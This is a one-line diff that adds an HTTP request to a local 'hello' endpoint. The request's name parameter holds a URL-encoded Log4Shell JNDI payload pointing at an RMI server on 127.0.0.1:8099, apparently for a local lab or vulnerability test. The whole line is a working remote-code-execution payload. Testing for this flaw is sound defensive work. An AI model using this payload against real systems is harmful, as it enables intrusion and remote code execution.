@@ -1,0 +1,1 @@
+GET http://localhost:8080/hello?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A8099%2Fexec%7D
